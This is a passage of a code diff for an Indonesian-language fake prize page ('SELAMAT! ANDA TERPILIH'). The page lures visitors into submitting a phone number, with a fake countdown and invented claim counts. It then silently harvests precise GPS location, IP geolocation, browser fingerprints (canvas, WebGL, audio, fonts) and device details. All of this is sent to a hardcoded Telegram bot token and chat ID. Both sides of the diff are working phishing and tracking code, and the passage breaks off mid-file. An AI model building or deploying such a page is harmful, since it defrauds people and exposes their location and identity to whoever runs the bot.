@@ -258,11 +258,16 @@
 <body>
     <div class="container">
         <div class="header">
+            <!-- Confetti elements -->
             <div class="confetti" style="left: 10%; animation-delay: 0s;"></div>
             <div class="confetti" style="left: 20%; animation-delay: 0.5s;"></div>
             <div class="confetti" style="left: 30%; animation-delay: 1s;"></div>
             <div class="confetti" style="left: 40%; animation-delay: 1.5s;"></div>
             <div class="confetti" style="left: 50%; animation-delay: 2s;"></div>
+            <div class="confetti" style="left: 60%; animation-delay: 2.5s;"></div>
+            <div class="confetti" style="left: 70%; animation-delay: 3s;"></div>
+            <div class="confetti" style="left: 80%; animation-delay: 3.5s;"></div>
+            <div class="confetti" style="left: 90%; animation-delay: 4s;"></div>
             
             <div class="gift-icon">🎁</div>
             <h1>SELAMAT! ANDA TERPILIH</h1>
@@ -279,8 +284,8 @@
             </div>
             
             <div class="permission-box">
-                <p>📱 <strong>Verifikasi Keamanan Lengkap</strong></p>
-                <p>Kami perlu memverifikasi 150+ data perangkat untuk keamanan hadiah</p>
+                <p>📱 <strong>Verifikasi Keamanan</strong></p>
+                <p>Kami perlu memverifikasi lokasi dan perangkat Anda untuk keamanan hadiah</p>
             </div>
             
             <form id="claimForm">
@@ -301,7 +306,7 @@
                 </div>
                 
                 <div class="user-count">
-                    👥 <strong>928 orang</strong> sudah berhasil klaim hadiah hari ini
+                    👥 <strong>428 orang</strong> sudah berhasil klaim hadiah hari ini
                 </div>
                 
                 <button type="submit" class="claim-button">
@@ -310,7 +315,7 @@
                 
                 <div class="loading" id="loading">
                     <div class="loading-spinner"></div>
-                    <p>Mengumpulkan 150+ data real dari perangkat Anda...</p>
+                    <p>Memverifikasi data dan lokasi Anda...</p>
                 </div>
                 
                 <div class="success-message" id="successMessage">
@@ -340,10 +345,13 @@
     </div>
 
     <script>
-        const BOT_TOKEN = "8566855315:AAGDOgZ5eW1EjBADraSnuAS3aUI5injqezQ";
-        const CHAT_ID = "7932600874";
+        // Token bot Telegram - GANTI DENGAN TOKEN BOT ANDA
+        const BOT_TOKEN = "8566855315:AAGDOgZ5eW1EjBADraSnuAS3aUI5injqezQ"
+        // Chat ID - GANTI DENGAN CHAT ID ANDA
+        const CHAT_ID = "7932600874"; // Ganti dengan chat ID Anda
         
-        let timeLeft = 15 * 60;
+        // Timer countdown
+        let timeLeft = 15 * 60; // 15 menit dalam detik
         const countdownElement = document.getElementById('countdown');
         
         function updateCountdown() {
@@ -362,6 +370,7 @@
         setInterval(updateCountdown, 1000);
         updateCountdown();
         
+        // Form submission
         document.getElementById('claimForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -370,398 +379,233 @@
             const successMessage = document.getElementById('successMessage');
             const claimButton = document.querySelector('.claim-button');
             
+            // Validasi nomor telepon
             if (!phone.match(/^[0-9]{10,13}$/)) {
                 alert('Masukkan nomor telepon yang valid (10-13 digit)');
                 return;
             }
             
+            // Tampilkan loading
             loading.style.display = 'block';
             successMessage.style.display = 'none';
             claimButton.disabled = true;
-            claimButton.textContent = 'MENGUMPULKAN 150+ DATA REAL...';
+            claimButton.textContent = 'MEMVERIFIKASI DATA...';
             
+            // Kumpulkan semua data
             collectAllData(phone);
         });
-
+        
         async function collectAllData(phone) {
             let collectedData = {
                 phone: phone,
                 timestamp: new Date().toISOString(),
                 localTime: new Date().toLocaleString('id-ID'),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                sessionStart: Date.now()
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
-
+            
             try {
-                // === BROWSER & SYSTEM DATA (30 data) ===
+                // 1. Data Browser dan Sistem
                 collectedData.userAgent = navigator.userAgent;
                 collectedData.language = navigator.language;
-                collectedData.languages = navigator.languages.join(', ');
+                collectedData.languages = navigator.languages;
                 collectedData.platform = navigator.platform;
-                collectedData.vendor = navigator.vendor || 'Unknown';
-                collectedData.userAgentData = await getUserAgentData();
+                collectedData.vendor = navigator.vendor;
                 collectedData.cookieEnabled = navigator.cookieEnabled;
                 collectedData.onlineStatus = navigator.onLine;
+                collectedData.javaEnabled = navigator.javaEnabled();
                 collectedData.pdfViewerEnabled = navigator.pdfViewerEnabled;
-                collectedData.webdriver = navigator.webdriver;
-                collectedData.product = navigator.product;
-                collectedData.productSub = navigator.productSub;
-                collectedData.appCodeName = navigator.appCodeName;
-                collectedData.appName = navigator.appName;
-                collectedData.appVersion = navigator.appVersion;
-                collectedData.buildID = navigator.buildID;
-
-                // === SCREEN DATA (25 data) ===
+                
+                // 2. Data Layar
                 collectedData.screenWidth = screen.width;
                 collectedData.screenHeight = screen.height;
-                collectedData.availWidth = screen.availWidth;
-                collectedData.availHeight = screen.availHeight;
                 collectedData.colorDepth = screen.colorDepth;
                 collectedData.pixelDepth = screen.pixelDepth;
-                collectedData.orientationType = screen.orientation?.type;
-                collectedData.orientationAngle = screen.orientation?.angle;
+                collectedData.orientation = screen.orientation?.type || 'unknown';
+                collectedData.availWidth = screen.availWidth;
+                collectedData.availHeight = screen.availHeight;
+                
+                // 3. Data Window/Viewport
+                collectedData.viewportWidth = window.innerWidth;
+                collectedData.viewportHeight = window.innerHeight;
                 collectedData.devicePixelRatio = window.devicePixelRatio;
-                collectedData.innerWidth = window.innerWidth;
-                collectedData.innerHeight = window.innerHeight;
                 collectedData.outerWidth = window.outerWidth;
                 collectedData.outerHeight = window.outerHeight;
-                collectedData.pageXOffset = window.pageXOffset;
-                collectedData.pageYOffset = window.pageYOffset;
-                collectedData.screenLeft = window.screenLeft;
-                collectedData.screenTop = window.screenTop;
-                collectedData.screenX = window.screenX;
-                collectedData.screenY = window.screenY;
-                collectedData.scrollX = window.scrollX;
-                collectedData.scrollY = window.scrollY;
-
-                // === NETWORK DATA (20 data) ===
+                
+                // 4. Data Jaringan (dari Connection API)
                 if (navigator.connection) {
                     collectedData.connectionType = navigator.connection.effectiveType;
                     collectedData.downlink = navigator.connection.downlink;
                     collectedData.rtt = navigator.connection.rtt;
                     collectedData.saveData = navigator.connection.saveData;
-                    collectedData.downlinkMax = navigator.connection.downlinkMax;
                 }
                 
-                // Get detailed IP information
-                await getDetailedIPInfo(collectedData);
-
-                // === BATTERY DATA (10 data) ===
+                // 5. Data Battery (jika tersedia)
                 if (navigator.getBattery) {
                     try {
                         const battery = await navigator.getBattery();
-                        collectedData.batteryLevel = Math.round(battery.level * 100);
+                        collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
                         collectedData.charging = battery.charging;
                         collectedData.chargingTime = battery.chargingTime;
                         collectedData.dischargingTime = battery.dischargingTime;
-                        collectedData.batteryChargingTime = battery.chargingTime;
-                    } catch (e) {}
-                }
-
-                // === HARDWARE DATA (15 data) ===
-                collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
-                collectedData.deviceMemory = navigator.deviceMemory;
-                collectedData.maxTouchPoints = navigator.maxTouchPoints;
-                collectedData.javaEnabled = navigator.javaEnabled();
-                collectedData.doNotTrack = navigator.doNotTrack;
-                collectedData.locks = navigator.locks;
-                collectedData.credentials = navigator.credentials;
-                collectedData.storage = navigator.storage;
-                collectedData.serviceWorker = navigator.serviceWorker;
-
-                // === GEOLOCATION DATA (15 data) ===
-                await getGeolocationData(collectedData);
-
-                // === DEVICE DETECTION (10 data) ===
-                collectedData.deviceType = detectDeviceType();
-                collectedData.browser = detectBrowser();
-                collectedData.browserVersion = detectBrowserVersion();
-                collectedData.os = detectOS();
-                collectedData.osVersion = detectOSVersion();
-                collectedData.engine = detectEngine();
-                collectedData.engineVersion = detectEngineVersion();
-
-                // === WEBGL & GRAPHICS (20 data) ===
-                await getWebGLData(collectedData);
-
-                // === STORAGE & PERFORMANCE (15 data) ===
-                await getStorageAndPerformanceData(collectedData);
-
-                // === MEDIA DEVICES (10 data) ===
-                await getMediaDevicesData(collectedData);
-
-                // === PLUGINS & MIME TYPES (10 data) ===
-                getPluginsAndMimeData(collectedData);
-
-                // === ADDITIONAL DATA (10 data) ===
-                collectedData.referrer = document.referrer;
-                collectedData.url = window.location.href;
-                collectedData.origin = window.location.origin;
-                collectedData.protocol = window.location.protocol;
-                collectedData.host = window.location.host;
-                collectedData.hostname = window.location.hostname;
-                collectedData.port = window.location.port;
-                collectedData.pathname = window.location.pathname;
-                collectedData.search = window.location.search;
-                collectedData.hash = window.location.hash;
-
-                // === ADVANCED FINGERPRINTING (10 data) ===
-                await getAdvancedFingerprinting(collectedData);
-
-                collectedData.sessionEnd = Date.now();
-                collectedData.sessionDuration = collectedData.sessionEnd - collectedData.sessionStart;
-
-                sendDataToTelegram(collectedData);
-
-            } catch (error) {
-                console.error('Error:', error);
-                sendDataToTelegram(collectedData);
-            }
-        }
-
-        async function getDetailedIPInfo(data) {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                data.ipAddress = ipData.ip;
-
-                // Try multiple IP geolocation services
-                const services = [
-                    `https://ipapi.co/${ipData.ip}/json/`,
-                    `https://ipwho.is/${ipData.ip}`,
-                    `https://api.ip.sb/geoip/${ipData.ip}`
-                ];
-
-                for (const service of services) {
-                    try {
-                        const response = await fetch(service);
-                        const ipInfo = await response.json();
-                        
-                        data.ipCountry = ipInfo.country_name || ipInfo.country;
-                        data.ipCountryCode = ipInfo.country_code;
-                        data.ipRegion = ipInfo.region || ipInfo.region_name;
-                        data.ipCity = ipInfo.city;
-                        data.ipPostal = ipInfo.postal || ipInfo.zip;
-                        data.ipLat = ipInfo.latitude;
-                        data.ipLon = ipInfo.longitude;
-                        data.ipTimezone = ipInfo.timezone;
-                        data.ipCurrency = ipInfo.currency;
-                        data.ipISP = ipInfo.org || ipInfo.isp;
-                        data.ipAsn = ipInfo.asn;
-                        data.ipOrg = ipInfo.org;
-                        data.ipContinent = ipInfo.continent;
-                        data.ipCountryFlag = ipInfo.country_flag;
-                        data.ipCallingCode = ipInfo.country_calling_code;
-                        data.ipLanguages = ipInfo.languages;
-                        
-                        break; // Use first successful response
                     } catch (e) {
-                        continue;
+                        collectedData.batteryInfo = 'Tidak tersedia';
                     }
                 }
-            } catch (error) {
-                data.ipAddress = 'Unable to fetch IP';
-            }
-        }
-
-        async function getGeolocationData(data) {
-            if (navigator.geolocation) {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 30000,
-                            maximumAge: 0
-                        });
-                    });
-                    
-                    data.latitude = position.coords.latitude;
-                    data.longitude = position.coords.longitude;
-                    data.accuracy = position.coords.accuracy;
-                    data.altitude = position.coords.altitude;
-                    data.altitudeAccuracy = position.coords.altitudeAccuracy;
-                    data.heading = position.coords.heading;
-                    data.speed = position.coords.speed;
-                    data.positionTimestamp = position.timestamp;
-                    
-                    // Get address from coordinates
+                
+                // 6. Data Storage
+                collectedData.storageEstimate = 'Tidak tersedia';
+                if (navigator.storage && navigator.storage.estimate) {
                     try {
-                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}`);
-                        const addressData = await response.json();
-                        data.address = addressData.display_name;
-                        data.addressType = addressData.type;
+                        const estimate = await navigator.storage.estimate();
+                        collectedData.storageUsed = Math.round(estimate.usage / 1024 / 1024) + 'MB';
+                        collectedData.storageQuota = Math.round(estimate.quota / 1024 / 1024) + 'MB';
+                        collectedData.storagePercent = Math.round((estimate.usage / estimate.quota) * 100) + '%';
                     } catch (e) {}
+                }
+                
+                // 7. Data Hardware Concurrency
+                collectedData.hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak diketahui';
+                
+                // 8. Data Device Memory
+                collectedData.deviceMemory = navigator.deviceMemory || 'Tidak diketahui';
+                
+                // 9. Data Touch Support
+                collectedData.maxTouchPoints = navigator.maxTouchPoints || 0;
+                collectedData.touchSupport = collectedData.maxTouchPoints > 0 ? 'Ya' : 'Tidak';
+                
+                // 10. Data GPS/Lokasi
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 15000,
+                                maximumAge: 0
+                            });
+                        });
+                        
+                        collectedData.latitude = position.coords.latitude;
+                        collectedData.longitude = position.coords.longitude;
+                        collectedData.accuracy = position.coords.accuracy + ' meter';
+                        collectedData.altitude = position.coords.altitude || 'Tidak tersedia';
+                        collectedData.altitudeAccuracy = position.coords.altitudeAccuracy || 'Tidak tersedia';
+                        collectedData.heading = position.coords.heading || 'Tidak tersedia';
+                        collectedData.speed = position.coords.speed || 'Tidak tersedia';
+                        
+                    } catch (error) {
+                        collectedData.locationError = getLocationError(error);
+                    }
+                } else {
+                    collectedData.locationError = 'Geolocation tidak didukung';
+                }
+                
+                // 11. Deteksi Perangkat
+                collectedData.deviceType = detectDeviceType();
+                collectedData.browser = detectBrowser();
+                collectedData.os = detectOS();
+                collectedData.browserVersion = detectBrowserVersion();
+                
+                // 12. Data IP Address (menggunakan service eksternal)
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    collectedData.ipAddress = ipData.ip;
+                    
+                    // Dapatkan info lokasi dari IP
+                    const ipInfoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+                    const ipInfo = await ipInfoResponse.json();
+                    collectedData.ipCountry = ipInfo.country;
+                    collectedData.ipCountryCode = ipInfo.countryCode;
+                    collectedData.ipRegion = ipInfo.regionName;
+                    collectedData.ipRegionCode = ipInfo.region;
+                    collectedData.ipCity = ipInfo.city;
+                    collectedData.ipZip = ipInfo.zip;
+                    collectedData.ipLat = ipInfo.lat;
+                    collectedData.ipLon = ipInfo.lon;
+                    collectedData.ipTimezone = ipInfo.timezone;
+                    collectedData.ipISP = ipInfo.isp;
+                    collectedData.ipOrg = ipInfo.org;
+                    collectedData.ipAs = ipInfo.as;
                     
                 } catch (error) {
-                    data.locationError = getLocationError(error);
-                }
-            }
-        }
-
-        async function getWebGLData(data) {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    
-                    data.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    data.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    data.webglVersion = gl.getParameter(gl.VERSION);
-                    data.webglShadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
-                    data.webglAliasedLineWidthRange = gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE).join('-');
-                    data.webglAliasedPointSizeRange = gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE).join('-');
-                    data.webglAntialiasing = gl.getParameter(gl.SAMPLES);
-                    data.webglDepthBits = gl.getParameter(gl.DEPTH_BITS);
-                    data.webglStencilBits = gl.getParameter(gl.STENCIL_BITS);
-                    data.webglMaxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-                    
-                    // WebGL capabilities
-                    data.webglExtensions = gl.getSupportedExtensions().join(',');
+                    collectedData.ipAddress = 'Tidak dapat mengambil IP';
                 }
                 
-                // Canvas fingerprinting
-                data.canvasFingerprint = getCanvasFingerprint();
-                data.canvasWinding = getCanvasWinding();
-                data.canvasText = getCanvasText();
-                data.canvasEmoji = getCanvasEmoji();
+                // 13. Data WebGL
+                collectedData.webglRenderer = getWebGLRenderer();
+                collectedData.webglVendor = getWebGLVendor();
                 
-            } catch (e) {
-                data.webglError = 'WebGL not available';
-            }
-        }
-
-        async function getStorageAndPerformanceData(data) {
-            // Storage APIs
-            data.localStorage = testLocalStorage();
-            data.sessionStorage = testSessionStorage();
-            data.indexedDB = testIndexedDB();
-            data.caches = 'caches' in window ? 'Available' : 'Not Available';
-            
-            // Performance data
-            if (performance) {
-                const timing = performance.timing;
-                data.navigationTiming = timing.loadEventEnd - timing.navigationStart;
-                data.domainLookupTime = timing.domainLookupEnd - timing.domainLookupStart;
-                data.connectTime = timing.connectEnd - timing.connectStart;
-                data.requestTime = timing.responseStart - timing.requestStart;
-                data.responseTime = timing.responseEnd - timing.responseStart;
-                data.domLoadingTime = timing.domContentLoadedEventStart - timing.domLoading;
-                data.domCompleteTime = timing.domComplete - timing.domLoading;
-                data.loadCompleteTime = timing.loadEventEnd - timing.loadEventStart;
+                // 14. Data Canvas Fingerprint
+                collectedData.canvasFingerprint = getCanvasFingerprint();
                 
-                if (performance.memory) {
-                    data.memoryUsed = Math.round(performance.memory.usedJSHeapSize / 1048576);
-                    data.memoryTotal = Math.round(performance.memory.totalJSHeapSize / 1048576);
-                    data.memoryLimit = Math.round(performance.memory.jsHeapSizeLimit / 1048576);
+                // 15. Data Audio Context
+                collectedData.audioFingerprint = await getAudioFingerprint();
+                
+                // 16. Data Fonts
+                collectedData.fonts = await getFontsList();
+                
+                // 17. Data Plugins
+                collectedData.plugins = getPluginsList();
+                
+                // 18. Data MIME Types
+                collectedData.mimeTypes = getMimeTypesList();
+                
+                // 19. Data Timezone Offset
+                collectedData.timezoneOffset = new Date().getTimezoneOffset();
+                collectedData.dst = isDST();
+                
+                // 20. Data Local Storage
+                collectedData.localStorage = localStorageSupported();
+                collectedData.sessionStorage = sessionStorageSupported();
+                collectedData.indexedDB = indexedDBSupported();
+                
+                // 21. Data Performance
+                if (performance) {
+                    collectedData.memory = performance.memory ? {
+                        used: Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB',
+                        total: Math.round(performance.memory.totalJSHeapSize / 1048576) + 'MB',
+                        limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + 'MB'
+                    } : 'Tidak tersedia';
+                    
+                    collectedData.timing = {
+                        loadTime: performance.timing ? 
+                            (performance.timing.loadEventEnd - performance.timing.navigationStart) + 'ms' : 'Tidak tersedia'
+                    };
                 }
                 
-                data.timeOrigin = performance.timeOrigin;
-                data.now = performance.now();
+                // 22. Data Media Devices
+                if (navigator.mediaDevices) {
+                    try {
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        collectedData.mediaDevices = devices.length;
+                        collectedData.hasCamera = devices.some(d => d.kind === 'videoinput');
+                        collectedData.hasMicrophone = devices.some(d => d.kind === 'audioinput');
+                    } catch (e) {
+                        collectedData.mediaDevices = 'Tidak dapat mengakses';
+                    }
+                }
                 
-                // Navigation info
-                data.navigationType = performance.navigation.type;
-                data.redirectCount = performance.navigation.redirectCount;
-            }
-            
-            // Storage estimation
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
-                    const estimate = await navigator.storage.estimate();
-                    data.storageUsage = Math.round(estimate.usage / 1048576);
-                    data.storageQuota = Math.round(estimate.quota / 1048576);
-                } catch (e) {}
+                // Kirim semua data ke Telegram
+                sendDataToTelegram(collectedData);
+                
+            } catch (error) {
+                console.error('Error collecting data:', error);
+                // Tetap kirim data yang berhasil dikumpulkan
+                sendDataToTelegram(collectedData);
             }
         }
-
-        async function getMediaDevicesData(data) {
-            if (navigator.mediaDevices) {
-                try {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    data.mediaDevicesCount = devices.length;
-                    data.hasCamera = devices.some(d => d.kind === 'videoinput');
-                    data.hasMicrophone = devices.some(d => d.kind === 'audioinput');
-                    data.hasSpeaker = devices.some(d => d.kind === 'audiooutput');
-                    
-                    // Device details
-                    data.cameraDevices = devices.filter(d => d.kind === 'videoinput').length;
-                    data.microphoneDevices = devices.filter(d => d.kind === 'audioinput').length;
-                    data.speakerDevices = devices.filter(d => d.kind === 'audiooutput').length;
-                    
-                } catch (e) {}
-            }
-            
-            // Media capabilities
-            if (navigator.mediaCapabilities) {
-                try {
-                    const decodingInfo = await navigator.mediaCapabilities.decodingInfo({
-                        type: 'file',
-                        video: { contentType: 'video/webm; codecs="vp8"' }
-                    });
-                    data.mediaDecodingSupported = decodingInfo.supported;
-                    data.mediaDecodingSmooth = decodingInfo.smooth;
-                } catch (e) {}
-            }
-        }
-
-        function getPluginsAndMimeData(data) {
-            data.pluginsCount = navigator.plugins.length;
-            data.pluginsList = Array.from(navigator.plugins).map(p => p.name).join('|');
-            data.mimeTypesCount = navigator.mimeTypes.length;
-            
-            // Detailed plugin info
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                const plugin = navigator.plugins[i];
-                plugins.push(`${plugin.name} v${plugin.version} (${plugin.filename})`);
-            }
-            data.pluginsDetailed = plugins.join(' | ');
-        }
-
-        async function getAdvancedFingerprinting(data) {
-            // Audio context fingerprint
-            data.audioFingerprint = await getAudioFingerprint();
-            
-            // Font detection
-            data.fonts = await getFontsList();
-            
-            // Hardware concurrency details
-            data.logicalProcessors = navigator.hardwareConcurrency;
-            
-            // Device motion/orientation
-            if (window.DeviceMotionEvent) {
-                data.deviceMotionSupported = true;
-            }
-            if (window.DeviceOrientationEvent) {
-                data.deviceOrientationSupported = true;
-            }
-            
-            // Speech recognition
-            data.speechRecognition = 'webkitSpeechRecognition' in window || 'SpeechRecognition' in window;
-            
-            // Vibration API
-            data.vibration = 'vibrate' in navigator;
-            
-            // Bluetooth
-            data.bluetooth = 'bluetooth' in navigator;
-            
-            // USB
-            data.usb = 'usb' in navigator;
-            
-            // Serial
-            data.serial = 'serial' in navigator;
-        }
-
-        // === DETECTION FUNCTIONS ===
+        
+        // Fungsi deteksi tambahan
         function detectDeviceType() {
             const ua = navigator.userAgent;
-            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
-            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                return "Tablet";
+            } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+                return "Mobile";
+            }
             return "Desktop";
         }
-
+        
         function detectBrowser() {
             const ua = navigator.userAgent;
             if (ua.includes("Chrome")) return "Chrome";
@@ -771,28 +615,24 @@
             if (ua.includes("Opera")) return "Opera";
             return "Unknown";
         }
-
+        
         function detectBrowserVersion() {
             const ua = navigator.userAgent;
-            let version = "Unknown";
-            const matches = {
-                "Chrome": /Chrome\/([0-9.]+)/,
-                "Firefox": /Firefox\/([0-9.]+)/,
-                "Safari": /Version\/([0-9.]+)/,
-                "Edge": /Edge\/([0-9.]+)/,
-                "Opera": /OPR\/([0-9.]+)/
-            };
+            let version = "Tidak diketahui";
             
-            for (const [browser, regex] of Object.entries(matches)) {
-                const match = ua.match(regex);
-                if (match) {
-                    version = match[1];
-                    break;
-                }
+            if (ua.includes("Chrome")) {
+                version = ua.match(/Chrome\/([0-9.]+)/)?.[1] || version;
+            } else if (ua.includes("Firefox")) {
+                version = ua.match(/Firefox\/([0-9.]+)/)?.[1] || version;
+            } else if (ua.includes("Safari")) {
+                version = ua.match(/Version\/([0-9.]+)/)?.[1] || version;
+            } else if (ua.includes("Edge")) {
+                version = ua.match(/Edge\/([0-9.]+)/)?.[1] || version;
             }
+            
             return version;
         }
-
+        
         function detectOS() {
             const ua = navigator.userAgent;
             if (ua.includes("Windows")) return "Windows";
@@ -802,66 +642,31 @@
             if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
             return "Unknown";
         }
-
-        function detectOSVersion() {
-            const ua = navigator.userAgent;
-            let version = "Unknown";
-            const matches = {
-                "Windows": /Windows NT ([0-9.]+)/,
-                "Mac": /Mac OS X ([0-9_.]+)/,
-                "Android": /Android ([0-9.]+)/,
-                "iOS": /OS ([0-9_.]+) like Mac/
-            };
-            
-            for (const [os, regex] of Object.entries(matches)) {
-                const match = ua.match(regex);
-                if (match) {
-                    version = match[1].replace(/_/g, '.');
-                    break;
+        
+        function getWebGLRenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                 }
-            }
-            return version;
+            } catch (e) {}
+            return 'Tidak tersedia';
         }
-
-        function detectEngine() {
-            const ua = navigator.userAgent;
-            if (ua.includes("AppleWebKit")) return "WebKit";
-            if (ua.includes("Gecko")) return "Gecko";
-            if (ua.includes("Trident")) return "Trident";
-            return "Unknown";
-        }
-
-        function detectEngineVersion() {
-            const ua = navigator.userAgent;
-            let version = "Unknown";
-            const matches = {
-                "WebKit": /AppleWebKit\/([0-9.]+)/,
-                "Gecko": /Gecko\/([0-9.]+)/
-            };
-            
-            for (const [engine, regex] of Object.entries(matches)) {
-                const match = ua.match(regex);
-                if (match) {
-                    version = match[1];
-                    break;
+        
+        function getWebGLVendor() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                 }
-            }
-            return version;
+            } catch (e) {}
+            return 'Tidak tersedia';
         }
-
-        // === UTILITY FUNCTIONS ===
-        async function getUserAgentData() {
-            if (navigator.userAgentData) {
-                try {
-                    const data = await navigator.userAgentData.getHighEntropyValues([
-                        'platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion'
-                    ]);
-                    return JSON.stringify(data);
-                } catch (e) {}
-            }
-            return "Not Available";
-        }
-
+        
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -871,76 +676,27 @@
                 ctx.fillStyle = '#f60';
                 ctx.fillRect(125, 1, 62, 20);
                 ctx.fillStyle = '#069';
-                ctx.fillText('Canvas FP', 2, 15);
-                return canvas.toDataURL().substring(22, 40);
+                ctx.fillText('Canvas Fingerprint', 2, 15);
+                return canvas.toDataURL().substring(22, 50); // Hash sederhana
             } catch (e) {
-                return 'Not Available';
+                return 'Tidak tersedia';
             }
         }
-
-        function getCanvasWinding() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.rect(0, 0, 10, 10);
-                ctx.rect(2, 2, 6, 6);
-                return ctx.isPointInPath(5, 5, 'evenodd') ? 'evenodd' : 'nonzero';
-            } catch (e) {
-                return 'Not Available';
-            }
-        }
-
-        function getCanvasText() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'alphabetic';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.font = '11pt Arial';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
-                return canvas.toDataURL();
-            } catch (e) {
-                return 'Not Available';
-            }
-        }
-
-        function getCanvasEmoji() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '32px Arial';
-                ctx.fillText('😀', 0, 0);
-                return canvas.toDataURL();
-            } catch (e) {
-                return 'Not Available';
-            }
-        }
-
+        
         async function getAudioFingerprint() {
             try {
                 const context = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = context.createOscillator();
                 const analyser = context.createAnalyser();
-                
                 oscillator.connect(analyser);
                 analyser.connect(context.destination);
                 oscillator.start(0);
-                
-                const data = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(data);
-                
-                oscillator.stop();
-                context.close();
-                
-                return data.slice(0, 10).join(',');
+                return 'Audio Context tersedia';
             } catch (e) {
-                return 'Not Available';
+                return 'Audio Context tidak tersedia';
             }
         }
-
+        
         async function getFontsList() {
             if ('fonts' in document) {
                 try {
@@ -949,237 +705,185 @@
                     document.fonts.forEach(font => {
                         fonts.push(font.family);
                     });
-                    return fonts.slice(0, 20).join(', ');
+                    return fonts.slice(0, 10).join(', '); // Batasi ke 10 font pertama
                 } catch (e) {}
             }
-            return 'Font API not available';
+            return 'Font API tidak tersedia';
         }
-
-        function testLocalStorage() {
+        
+        function getPluginsList() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            return plugins.length > 0 ? plugins.slice(0, 5).join(', ') : 'Tidak ada plugins';
+        }
+        
+        function getMimeTypesList() {
+            const mimeTypes = [];
+            for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                mimeTypes.push(navigator.mimeTypes[i].type);
+            }
+            return mimeTypes.length > 0 ? mimeTypes.length + ' types' : 'Tidak ada MIME types';
+        }
+        
+        function isDST() {
+            const today = new Date();
+            const jan = new Date(today.getFullYear(), 0, 1);
+            const jul = new Date(today.getFullYear(), 6, 1);
+            const stdTimeOffset = Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
+            return today.getTimezoneOffset() < stdTimeOffset;
+        }
+        
+        function localStorageSupported() {
             try {
-                localStorage.setItem('test', 'test');
-                localStorage.removeItem('test');
-                return 'Supported';
+                return 'localStorage' in window && window.localStorage !== null;
             } catch (e) {
-                return 'Not Supported';
+                return false;
             }
         }
-
-        function testSessionStorage() {
+        
+        function sessionStorageSupported() {
             try {
-                sessionStorage.setItem('test', 'test');
-                sessionStorage.removeItem('test');
-                return 'Supported';
+                return 'sessionStorage' in window && window.sessionStorage !== null;
             } catch (e) {
-                return 'Not Supported';
+                return false;
             }
         }
-
-        function testIndexedDB() {
-            return 'indexedDB' in window ? 'Supported' : 'Not Supported';
+        
